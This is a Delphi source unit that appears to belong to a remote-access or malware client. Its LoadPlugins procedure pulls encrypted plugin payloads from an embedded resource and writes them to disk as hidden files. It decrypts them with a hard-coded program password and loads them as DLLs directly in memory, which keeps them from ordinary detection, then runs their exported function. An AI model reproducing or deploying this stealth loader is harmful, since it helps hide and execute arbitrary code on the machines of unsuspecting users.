unit UnitPlugins;

interface

uses
  Windows, UnitFunctions, UnitEncryption, UnitConstants, UnitConfiguration,
  BTMemoryModule;

var
  LoadingPlugins: Boolean;

procedure LoadPlugins;

implementation
       
procedure LoadPlugins;
var
  Buffer, TmpStr, PluginFile: string;
  BufferSize: Int64;
  Execute: Boolean;
  Module: PBTMemoryModule;
  p: Pointer;
  PluginFunction: procedure();
begin
  TmpStr := GetResourceAsString('PLGS');
  LoadingPlugins  := TmpStr <> '';
  if not LoadingPlugins then Exit;

  while TmpStr <> '' do
  begin                          
    Execute := MyStrToBool(Copy(TmpStr, 1, Pos('|', TmpStr) - 1));
    Delete(TmpStr, 1, Pos('|', TmpStr));
    BufferSize := StrToInt(Copy(TmpStr, 1, Pos('|', TmpStr) - 1));
    Delete(TmpStr, 1, Pos('|', TmpStr));
    Buffer := Copy(TmpStr, 1, BufferSize);
    Delete(TmpStr, 1, BufferSize);
       
    PluginFile := PluginsDir + '\' + IntToStr(GetTickCount);
    if not FileExists(PluginFile) then
    begin
      MyCreateFile(PluginFile, Buffer, Length(Buffer));
      HideFileName(PluginFile);
    end;

    if Execute then
    begin
      BufferSize := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1));
      Delete(Buffer, 1, Pos('|', Buffer));
      Delete(Buffer, 1, BufferSize);
      Buffer := EnDecryptText(Buffer, PROGRAMPASSWORD);
      if Buffer = '' then Continue;
      p := @Buffer[1];
      Module := BTMemoryLoadLibary(p, Length(Buffer));
      if Module = nil then Continue;
      @PluginFunction := BTMemoryGetProcAddress(Module, 'PluginFunction');
      if Assigned(PluginFunction) then PluginFunction;
    end;
  end;

  LoadingPlugins := False;                                       
end;

end.
